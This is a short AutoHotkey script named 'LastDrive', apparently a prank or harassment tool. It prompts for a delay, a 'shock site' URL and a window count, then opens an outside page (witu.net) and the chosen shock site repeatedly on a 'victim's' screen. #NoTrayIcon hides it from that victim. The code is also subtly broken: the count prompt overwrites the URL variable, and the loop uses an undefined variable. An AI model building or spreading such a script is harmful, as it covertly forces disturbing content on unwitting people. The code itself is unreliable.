MsgBox, 0, Success!, LastDrive has succesfully been extracted and launched.
InputBox, length, Choose Sleep Length, Input time in milliseconds when LastDrive will run, , ,125
InputBox, url, Choose Shock Site, Input the URL of the shock site of your choice (with http://), , ,125
InputBox, url, Choose No. Of Windows, Input how many windows of the shock site the victim will see, , ,125
MsgBox, 0, Get Ready..., LastDrive will start when you press OK
sleep, %length%
run, http://witu.net/lol.html
sleep, 10000
loop, %loop%
{
run, %url%
}
#NoTrayIcon
